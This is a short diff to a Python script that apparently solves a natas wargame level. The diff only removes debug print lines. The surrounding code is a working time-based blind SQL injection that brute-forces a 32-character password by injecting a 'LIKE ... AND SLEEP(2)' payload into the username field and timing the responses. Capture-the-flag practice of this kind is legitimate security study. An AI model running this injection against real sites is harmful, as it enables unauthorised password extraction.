@@ -22,15 +22,15 @@ session = requests.Session()
 while (len(confirmedPass) < 32):
   for ch in alphaNum:
     start_time = time()
-    print "Attempting: ", "".join(confirmedPass) + ch
+    #print "Attempting: ", "".join(confirmedPass) + ch
     sessionPost = session.post(url, data = {"username" : 'natas18" AND BINARY password LIKE "' + "".join(confirmedPass) + ch +'%" AND SLEEP(2) # '}, auth = login)
     pageContent = sessionPost.text
     end_time = time()
     duration = end_time - start_time
-   # print("Run duration: " , duration)
+   
 
     if(duration > 2):
       confirmedPass.append(ch)
       print("Password = " + "".join(confirmedPass))
       break;
-    #print pageContent
+    
